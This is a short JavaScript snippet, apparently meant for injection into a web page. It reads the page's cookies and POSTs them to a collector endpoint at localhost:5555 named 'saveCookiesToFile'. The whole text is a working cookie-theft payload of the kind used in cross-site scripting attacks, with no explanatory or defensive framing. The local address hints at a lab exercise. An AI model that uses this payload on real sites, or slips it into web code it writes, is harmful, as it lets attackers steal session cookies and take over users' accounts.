var cookies = document.cookie;

console.log(cookies);

if (cookies.length > 0) {
	$.ajax({
		type: "POST",
		url: "http://localhost:5555/api/data/saveCookiesToFile",
		data: cookies,
		success: function () {
			console.log("cokies were sent");
		}
	});
}